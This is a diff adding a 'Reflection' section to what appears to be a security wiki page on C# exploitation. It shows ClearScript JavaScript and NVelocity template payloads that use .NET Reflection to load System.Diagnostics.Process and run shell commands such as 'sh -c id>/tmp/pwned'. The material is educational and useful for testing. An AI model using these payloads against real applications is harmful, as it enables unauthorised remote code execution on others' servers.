@@ -195,6 +195,91 @@ Gadget(calc.exe, 1337)
 
 Some gadgets will call methods on your arguments, such as the `HashMap` calling `.hashCode()` to turn it into a unique integer. This means any vulnerable logic inside an object's `hashCode` implementation will also be callable if we just wrap in in a hashmap! Combing gadgets in chains like this is the standard way to find exploits.
 
+## Reflection
+
+Like many languages, C# has ways to interact with the type system at runtime through Reflection. This is useful in exploits when you can execute some limited C# code, or an interpreter of another language while having some interoperability. In such cases, you can often access properties and call methods on objects, and using Reflection, that can lead to RCE.
+
+This is mainly done with chaining built-in methods on various types. All methods and attributes are well-documented on the Microsoft site, for example, the [`Assembly` class](https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly?view=net-9.0).
+
+[Visual Studio](https://visualstudio.microsoft.com/) is the most featureful editor for C#. Something useful to us is when debugging any application, you can use the _Immediate Window_ to quickly evaluate some small bits of code and get correct auto-completion. This makes it easier to explore your options.
+
+<figure><img src="../.gitbook/assets/image (71).png" alt="" width="547"><figcaption><p>Auto-complete feature and getting immediate results in Visual Studio</p></figcaption></figure>
+
+We'll go through an example of **ClearScript**, a JavaScript interpreter that [used to have an issue](https://github.com/microsoft/ClearScript/issues/382) allowing access to Reflection (and can still be configured to do so via `AllowReflection=true`).
+
+Your first goal should be accessing the main `Assembly`, which you can get from a [`Type`](https://learn.microsoft.com/en-us/dotnet/api/system.type?view=net-9.0#properties)  as `.Assembly`. To always get the main assembly, you can get the type of a type, which will always be the built-in type. In the example below, `Helper` was a C# object passed into the sandboxed context. We can use it to get a reference to the assembly:
+
+```javascript
+const assembly = Helper.GetType().GetType().Assembly;
+```
+
+We will now use its [`Load(String)`](https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load?view=net-9.0#system-reflection-assembly-load\(system-string\)) method to import a built-in assembly that allows executing shell commands: [`System.Diagnostics.Process`](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.process?view=net-9.0). We can get access to [`MethodInfo`](https://learn.microsoft.com/en-us/dotnet/api/system.reflection.methodinfo?view=net-9.0) as a variable, and to call it, we'll use [`Invoke(Object, Object[])`](https://learn.microsoft.com/en-us/dotnet/api/system.reflection.methodbase.invoke?view=net-9.0#system-reflection-methodbase-invoke\(system-object-system-object\(\)\)) where the 2nd argument is an array representing the arguments passed to the method.
+
+To create an array, in some cases, the simple `[]` syntax isn't possible. Using more methods, however, we can construct one out of thin air. We'll construct a new variable of type [`List<String>`](https://learn.microsoft.com/en-us/dotnet/api/system.collections.generic.list-1?view=net-9.0) which has an [`Add()`](https://learn.microsoft.com/en-us/dotnet/api/system.collections.generic.list-1.add?view=net-9.0#system-collections-generic-list-1-add\(-0\)) method. To do so, we need to pass [`Assembly.CreateInstance()`](https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly.createinstance?view=net-9.0#system-reflection-assembly-createinstance\(system-string\)) a stringified version of the type, which we can get as follows:
+
+{% code title="C#" %}
+```csharp
+var list = new List<string>();
+list.GetType().ToString()  // "System.Collections.Generic.List`1[System.String]"
+```
+{% endcode %}
+
+Finally, to convert this mutable `List` into a `String[]`, we'll use its [`ToArray()`](https://learn.microsoft.com/en-us/dotnet/api/system.collections.generic.list-1.toarray?view=net-9.0#system-collections-generic-list-1-toarray) method:
+
+```javascript
+const assembly = Helper.GetType().GetType().Assembly;
+const load = assembly.GetType('System.Reflection.Assembly').GetMethods()[0];
+
+const args = assembly.CreateInstance('System.Collections.Generic.List`1[System.String]');
+args.Add('System.Diagnostics.Process');
+const process = load.Invoke(null, args.ToArray());
+```
+
+With this new `Process` assembly, we can prepare the arguments for its [`Start(String, String)`](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.process.start?view=net-9.0#system-diagnostics-process-start\(system-string-system-string\)) method which takes the command to execute as its 1st argument, and the arguments (split by space) as shell arguments into the 2nd argument. If we list all the methods, this happens to be the 70th, and we can invoke it similar to before:
+
+<pre class="language-javascript"><code class="lang-javascript">const args2 = assembly.CreateInstance('System.Collections.Generic.List`1[System.String]');
+args2.Add('sh');
+<strong>args2.Add('-c id>/tmp/pwned');
+</strong>console.log(process.GetType('System.Diagnostics.Process').GetMethods()[70].Invoke(null, args2.ToArray()));
+</code></pre>
+
+This should save the output of `id` into `/tmp/pwned`.
+
+Similarly, the [**NVelocity**](https://github.com/castleproject/NVelocity/blob/master/docs/nvelocity.md) templating framework can call arbitrary methods on C# objects, and thus is vulnerable to this Reflection abuse to reach RCE:
+
+<pre class="language-velocity" data-title="Exploit 1"><code class="lang-velocity">#set( $assembly = $name.GetType().GetType().Assembly )
+#set( $load = $assembly.GetType('System.Reflection.Assembly').GetMethods().Get(0) )
+#set( $args = $assembly.CreateInstance("System.Collections.Generic.List`1[System.String]") )
+$args.Add("System.Diagnostics.Process")
+$args
+#set( $process = $load.Invoke(null, $args.ToArray()) )
+$process
+#set( $args2 = $assembly.CreateInstance("System.Collections.Generic.List`1[System.String]") )
+$args2.Add("bash")
+<strong>$args2.Add("-c id>/tmp/pwned")
+</strong>${process.GetType('System.Diagnostics.Process').GetMethods().Get(70).Invoke(null, $args2.ToArray())}
+</code></pre>
+
+Finally, below is another exploit for the same framework that uses some different methods create a [`ProcessStartInfo`](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo?view=net-9.0) and also return its output in the template content:
+
+<pre class="language-velocity" data-title="Exploit 2"><code class="lang-velocity">#set($a = "")
+#set($activator_type = $a.GetType().Assembly.GetType("System.Activator"))
+#set($create_instance = $activator_type.GetMethods().Get(8))
+#set($args = ["System.Diagnostics.Process, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a", "System.Diagnostics.Process"])
+#set($wrapped_process = $create_instance.Invoke(null, $args.ToArray()))
+#set($process = $wrapped_process.Unwrap())
+
+#set($args = ["System.Diagnostics.Process, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a", "System.Diagnostics.ProcessStartInfo"])
+#set($wrapped_process_start_info = $create_instance.Invoke(null, $args.ToArray()))
+#set($process_start_info = $wrapped_process_start_info.Unwrap())
+
+<strong>#set($process_start_info.FileName = "id")
+</strong>#set($process_start_info.RedirectStandardOutput = true)
+
+#set($flag = $process.Start($process_start_info))
+<strong>$!flag.StandardOutput.ReadToEnd()
+</strong></code></pre>
+
 ## LINQ Injection
 
 [Language Integrated Query (LINQ)](https://learn.microsoft.com/en-us/dotnet/csharp/linq/) is a Microsoft library for C# used to query objects similar to SQL syntax. It does, however, support C# syntax with function calls embedded inside the syntax, such as:
